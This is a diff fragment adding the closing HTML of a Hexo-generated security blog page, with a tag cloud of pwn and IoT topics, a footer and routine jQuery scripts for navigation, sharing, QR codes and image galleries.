+				<li><a href="/tags/pwn/" title="pwn">pwn<sup>38</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/wp/" title="wp">wp<sup>24</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/tw/" title="tw">tw<sup>16</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/iot/" title="iot">iot<sup>15</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/笔记/" title="笔记">笔记<sup>11</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/路由器/" title="路由器">路由器<sup>9</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/栈溢出/" title="栈溢出">栈溢出<sup>8</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/堆/" title="堆">堆<sup>7</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/cve/" title="cve">cve<sup>4</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/环境搭建/" title="环境搭建">环境搭建<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/栈/" title="栈">栈<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/攻防世界/" title="攻防世界">攻防世界<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/命令注入/" title="命令注入">命令注入<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ubuntu18/" title="ubuntu18">ubuntu18<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/AWD/" title="AWD">AWD<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/命令执行/" title="命令执行">命令执行<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/认证绕过/" title="认证绕过">认证绕过<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/摄像头/" title="摄像头">摄像头<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/待完善/" title="待完善">待完善<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/canary/" title="canary">canary<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://whali3n51.github.io" target="_blank" title="whali3n51">whali3n51</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+
+	<p class="copyright">
+	Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/hsihohuang/kiddochan" target="_blank" title="Kiddochan">Kiddochan</a> © 2024 
+	
+	<a href="/about" target="_blank" title="p1Kk">p1Kk</a>
+	
+	
+	</p>
+</div></footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
